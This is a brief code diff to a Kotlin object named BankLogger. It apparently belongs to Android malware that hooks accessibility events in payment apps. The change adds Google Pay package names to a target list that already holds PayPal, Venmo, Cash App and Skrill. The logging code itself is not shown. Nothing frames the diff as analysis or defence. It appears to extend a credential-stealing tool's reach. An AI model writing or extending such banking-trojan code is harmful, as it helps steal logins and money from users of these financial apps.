@@ -18,7 +18,9 @@ object BankLogger {
         "com.paypal.android.p2pmobile",
         "com.venmo",
         "com.squareup.cash",
-        "com.moneybookers.skrillpayments"
+        "com.moneybookers.skrillpayments",
+        "com.google.android.apps.walletnfcrel",  // Google Pay
+        "com.google.android.apps.nbu.paisa.user"
     )
 
     fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
